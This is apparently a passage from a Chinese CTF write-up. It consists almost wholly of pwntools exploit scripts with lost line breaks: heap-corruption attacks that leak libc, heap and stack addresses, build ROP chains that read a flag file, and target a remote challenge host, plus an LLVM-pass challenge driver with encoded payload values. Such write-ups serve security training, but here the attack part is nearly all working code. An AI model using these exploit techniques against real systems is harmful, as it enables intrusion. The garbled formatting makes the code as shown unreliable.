 login() add(0x4e0,'a'*0x10,0) add(0x4e0,'a'*0x10,0) data='' for i in range(0x100): delete(0) add(0x4f2,'a'*0x4f0,1) show(0) io.recvuntil('content: ') data=io.recvuntil('n-----------menu',drop=True) if len(data) >0x4f0 : break
 key=[] for i in range(0x10): key.append(ord('a')^ord(data[0x4f0+i:0x4f1+i]))
 add(0xe0,'a'*0x10,0) add(0x4e0,'a'*0x10,0) add(0xe0,'a'*0x10,0) add(0x80,'a'*0x10,0) add(0xe0,'a'*0x10,0) add(0x180,'a'*0x10,0) add(0xe0,'a'*0x10,0) add(0x80,'a'*0x10,0) add(0x80,'a'*0x10,0) add(0x180,'a'*0x10,0) add(0x80,'a'*0x10,0)
 delete(3) add(0x4e0,'a'*8,0) show(3)
 leak=u64(io.recvuntil('x7f')[-6:]+'x00x00') libc_base=((leak-libc.sym['_IO_2_1_stdin_'])>>12)<<12 libc.address=libc_base bin_sh_addr=libc.search('/bin/shx00').next() system_addr=libc.sym['system'] free_hook_addr=libc.sym['__free_hook'] pop_rax_ret=libc.search(asm('pop rax;ret')).next() pop_rdi_ret=libc.search(asm('pop rdi;ret')).next() pop_rsi_ret=libc.search(asm('pop rsi;ret')).next() pop_rdx_ret=libc.search(asm('pop rdx;pop rbx;ret')).next() syscall_ret=libc.search(asm('syscall;ret')).next()
 def encode(a): j=0 c='' while j<len(a): for i in range(0x10): c+=chr(ord(a[j:j+1])^key[i]) j+=1 if j>=len(a): break return c
 delete(12) delete(5)
 for i in range(0x20): delete(4) add(0xf8,encode('a'*0xe8+p64(0x91)+p64(libc.sym['environ']-0x10)),1)
 add(0x80,'a'*0x10,0) add(0x80,'a'*0x10,0) show(12) io.recvuntil('a'*0x10) stack_addr=u64(io.recv(6)+'x00x00')-0x108
 delete(11) delete(7)
 for i in range(0x20): delete(6) add(0xf8,encode('a'*0xe8+p64(0x191)+p64(stack_addr)),1)
 pay='./flagx00x00' pay+=p64(pop_rdi_ret)+p64(stack_addr) pay+=p64(pop_rsi_ret)+p64(0) pay+=p64(pop_rax_ret)+p64(2)
 pay+=p64(syscall_ret) pay+=p64(pop_rax_ret)+p64(0) pay+=p64(pop_rdi_ret)+p64(3) pay+=p64(pop_rdx_ret)+p64(0x30)*2 pay+=p64(pop_rsi_ret)+p64(stack_addr-0x300) pay+=p64(syscall_ret)
 pay+=p64(pop_rax_ret)+p64(1) pay+=p64(pop_rdi_ret)+p64(1) pay+=p64(pop_rsi_ret)+p64(stack_addr-0x300) pay+=p64(syscall_ret) add(0x180,'aaaa',0) add(0x180,encode(pay),0)
 success('libc_base:'+hex(libc_base)) success('heap_base:'+hex(heap_base)) success('stack_addr:'+hex(stack_addr)) gdb_attach(io,gdb_text)
 io.interactive()
 # except Exception as e: # io.close() # continue # else: # continue
```



```
clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared Hello.cpp -o LLVMHello.so `llvm-config --ldflags`
```



```
HANDLE_OTHER_INST(56, Call   , CallInst   ) // Call a function
```



```
clang -emit-llvm -S test.c -o test.ll
opt -load ./LLVMHello.so -Hello test.ll
```



```
void Add(int a){ return ;}void Del(int a){ return ;}
void Edit(int a,int idx,int value){ return ;}
void Alloc(){ return ;}
void EditAlloc(){ return ;}
```



```
//b *(0x7fc2b50b6000+0x86F5)#include <stdio.h>void Add(int a){ return ;}
void Del(int a){ return ;}
void Edit(int a,int idx,int value){ return ;}
void Alloc(){ return ;}
void EditAlloc(){ return ;}
int main(){ Add(0xf0); Add(0xf0); Add(0xf0); Del(2); Del(1); Alloc(); Edit(0,0x100/4,0x10000); Add(0xf0); Add(0xf0); Edit(2,0,1220555080); Edit(2,1,1213658673); Edit(2,2,1768042431); Edit(2,3,1932472174); Edit(2,4,1599362920); Edit(2,5,261700528); Edit(2,6,5); Edit(2,(0x78B108-0x10000)/4,0x10000); Edit(2,((0x78B108-0x10000)/4)+1,0); EditAlloc(); return 0;}
```



```
#coding:utf-8import sysimport osfrom pwn import *from ctypes import CDLLfrom a_pb2 import *context.log_level='debug'elfelf='./pwn'libc_base=0heap_base=0#context.arch='amd64'while True : # try : elf=ELF(elfelf) context.arch=elf.arch gdb_text=''' b *$rebase(0x71E2) b *$rebase(0x7234) b *$rebase(0x7CA6) b *$rebase(0x50A7) '''
 if len(sys.argv)==1 : # io=process(['./'],env={'LD_PRELOAD':'./'}) io=process(elfelf) # clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') # clibc.srand(clibc.time(0)) gdb_open=1 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld.so.6') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 else : io=remote('172.20.2.1',9008) # clibc=CDLL('/lib/x86_64-linux-gnu/libc.so.6') # clibc.srand(clibc.time(0)) gdb_open=0 libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') # ld = ELF('/lib/x86_64-linux-gnu/ld.so.6') one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]
 def gdb_attach(io,a): if gdb_open==1 : gdb.attach(io,a) sleep(1)
 def choice(id,b,c): a=GoogleMessage() a.arg1=id a.arg2.content=b'a'*0x40 a.arg3.content=b a.arg3.idx=c pay=a.SerializeToString() return pay
 def choice1(id,b,c): a=GoogleMessage() a.arg1=id a.arg3.content=b'./flag' a.arg3.size=c # a.arg3.idx=c a.arg4.idx=b&0xffffffff a.arg4.content=b'c' a.arg4.size=b>>32 a.arg4.seek=0x80 pay=a.SerializeToString() return pay

 pay=choice(5,b'a'*0x40,0xaa) 0x2de8 io.sendlineafter(b'$ ',pay) io.sendline(b'32') io.recvuntil(b'a'*0x40) io.recv(6) heap_base=u64(io.recv(8)) io.recv(0x90)
 libc_base=u64(io.recv(8))-libc.sym['_IO_2_1_stdin_'] libc_base=libc_base&0xfffffffffffff000 libc.address=libc_base bin_sh_addr=next(libc.search(b'/bin/shx00')) system_addr=libc.sym['system'] free_hook_addr=libc.sym['__free_hook'] pop_rax_ret=next(libc.search(asm('pop rax;ret'))) pop_rdi_ret=next(libc.search(asm('pop rdi;ret'))) pop_rsi_ret=next(libc.search(asm('pop rsi;ret'))) pop_rdx_ret=next(libc.search(asm('pop rdx;pop rbx;ret'))) syscall_ret=next(libc.search(asm('syscall;ret')))
 pay=choice1(5,libc_base-0x109000+0x2de8,heap_base-0xa308) io.sendlineafter(b'$ ',pay) io.sendline(b'32') io.recvuntil('n5') canary=io.recv(8) flag_name_addr=heap_base-0x8ac0 pay=choice1(4,libc_base-0x109000+0x2de8,heap_base-0xa308)
 io.sendlineafter(b'$ ',pay) pay1=b'a'*0x1c+canary+p64(0) pay1+=p64(pop_rdi_ret)+p64(flag_name_addr) pay1+=p64(pop_rsi_ret)+p64(0) pay1+=p64(pop_rdx_ret)+p64(0x30)*2 pay1+=p64(pop_rax_ret)+p64(2) pay1+=p64(syscall_ret)

 pay1+=p64(pop_rax_ret)+p64(0) pay1+=p64(pop_rdi_ret)+p64(3) pay1+=p64(pop_rsi_ret)+p64(heap_base) pay1+=p64(syscall_ret)
 pay1+=p64(pop_rax_ret)+p64(1) pay1+=p64(pop_rdi_ret)+p64(1) pay1+=p64(pop_rsi_ret)+p64(heap_base) pay1+=p64(syscall_ret)
 gdb_attach(io,gdb_text) io.sendline(pay1)

 success('libc_base:'+hex(libc_base)) success('heap_base:'+hex(heap_base))

 io.interactive()
 # except Exception as e: # io.close() # continue # else: # continue
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/09/8-1694590217.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/09/8-1694590217.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/09/4-1694590217.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/09/8-1694590217.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/09/7-1694590218.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/09/7-1694590218.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/09/8-1694590218.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/09/6-1694590219.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/09/3-1694590219.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/09/8-1694590219.png)